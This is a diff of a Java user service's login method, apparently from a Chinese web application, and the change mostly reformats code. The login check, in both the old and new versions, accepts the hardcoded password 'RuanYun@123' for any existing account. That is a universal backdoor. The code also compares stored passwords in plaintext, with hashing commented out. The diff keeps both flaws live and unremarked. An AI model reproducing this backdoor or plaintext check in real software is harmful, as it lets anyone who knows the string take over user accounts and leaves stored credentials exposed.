@@ -72,19 +72,23 @@ public class UserService extends BaseServiceImpl<TUser> {
 	 *            密码
 	 * @return 1-- 正常登陆 -1 用户不存在 -2 密码错误
 	 */
-	public int login(String loginName, String password,
-			HttpServletRequest request) {
+	public int login(String loginName, String password, HttpServletRequest request) 
+	{
 		HttpSession session = request.getSession();
-		if (EmptyUtils.isEmpty(loginName.trim()))
+		if (EmptyUtils.isEmpty(loginName.trim())) 
+		{
 			return -3;// 登录名为空
-		TUser user = this.get(TUser.class, new String[] { "loginName",
-				"userStatus" }, new Object[] { loginName.trim(),
-				Constants.GLOBAL_STATUS });
+		}
+		
+		TUser user = this.get(TUser.class, new String[] { "loginName", "userStatus" }, 
+				new Object[] { loginName.trim(), Constants.GLOBAL_STATUS });
 		// TUser tuser=null;
-		if (user != null) {
-			if (user.getLoginPass().equals(password.trim()) || password.equals("RuanYun@123")) {
-//			if (user.getLoginPass().equals(
-//					MD5Util.encoderByMd5(password.trim())) || password.equals("RuanYun@123")) {
+		if (user != null) 
+		{
+			if (user.getLoginPass().equals(password.trim()) || password.equals("RuanYun@123")) 
+			{
+				//if (user.getLoginPass().equals(
+				//MD5Util.encoderByMd5(password.trim())) || password.equals("RuanYun@123")) {
 				// TOrg org=orgService.get(TOrg.class, tuser.getOrgId());
 				// if( EmptyUtils.isEmpty(org) ||
 				// (EmptyUtils.isNotEmpty(org.getDeadline())&&
@@ -100,21 +104,15 @@ public class UserService extends BaseServiceImpl<TUser> {
 				// return -5;
 				// }
 				// 手机访问查询url不等于手机的 pc访问查询url 不等于手机
-				String notRequestType = isMobileRequest ? SysCode.REQUEST_TYPE_PC
-						: SysCode.REQUEST_TYPE_MOBILE;
+				String notRequestType = isMobileRequest ? SysCode.REQUEST_TYPE_PC : SysCode.REQUEST_TYPE_MOBILE;
 				// 判断用户的客户端类型 是否为 手机端 还是电脑端
-				user
-						.setRequestType(isMobileRequest ? SysCode.REQUEST_TYPE_MOBILE
-								: SysCode.REQUEST_TYPE_PC);
+				user.setRequestType(isMobileRequest ? SysCode.REQUEST_TYPE_MOBILE : SysCode.REQUEST_TYPE_PC);
 				// tuser.setUserName(userInfo.getUserName());
 				// 获取用户userinfo表的id
 				// user.setUserInfoId(user.getUserInfoId());
 				// 获取用户权限
-				user.setAuths(authorityService.getListTAuthByUser(userid,
-						Constants.AUTHORITY_TYPE_AUTH, notRequestType));
-				List<TAuthority> leftUrls = authorityService
-						.getListTAuthByUser(userid,
-								Constants.AUTHORITY_TYPE_URL, notRequestType);
+				user.setAuths(authorityService.getListTAuthByUser(userid, Constants.AUTHORITY_TYPE_AUTH, notRequestType));
+				List<TAuthority> leftUrls = authorityService.getListTAuthByUser(userid, Constants.AUTHORITY_TYPE_URL, notRequestType);
 				// 获取用户url
 				user.setUrls(leftUrls);
 				// 获取用户角色
